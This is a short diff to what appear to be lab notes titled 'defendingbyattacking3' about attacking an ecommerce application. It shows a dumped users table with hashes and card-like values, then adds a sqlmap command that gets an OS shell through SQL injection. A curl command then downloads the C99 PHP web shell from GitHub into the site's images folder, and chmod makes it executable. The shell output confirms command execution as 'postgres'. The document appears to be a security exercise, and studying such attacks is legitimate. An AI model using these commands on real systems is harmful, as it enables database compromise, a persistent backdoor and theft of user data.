@@ -157,4 +157,22 @@ Table: users
 | 2  | SSN-2 | Demo user | demo@demo.com | 1st Demo St., Washington DC    | fe01ce2a7fbac8fafaed7c982a04e229 (demo) | demo     | Mastercard-1234-1234 |
 +----+-------+-----------+---------------+--------------------------------+-----------------------------------------+----------+----------------------+
 
+# defendingbyattacking3
+sqlmap -r /home/kali/Desktop/loginrequest.raw -D public  --os-shell  
+curl -o /var/projects/ecommerce/images/c99shell.php https://raw.githubusercontent.com/KaizenLouie/C99Shell-PHP7/master/c99shell.php
+chmod 755 /var/projects/ecommerce/images/c99shell.php
 
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a] Y
+[13:11:21] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[13:11:21] [INFO] retrieved: 'postgres'
+command standard output:
+---
+p
+o
+s
+t
+g
+r
+e
+s
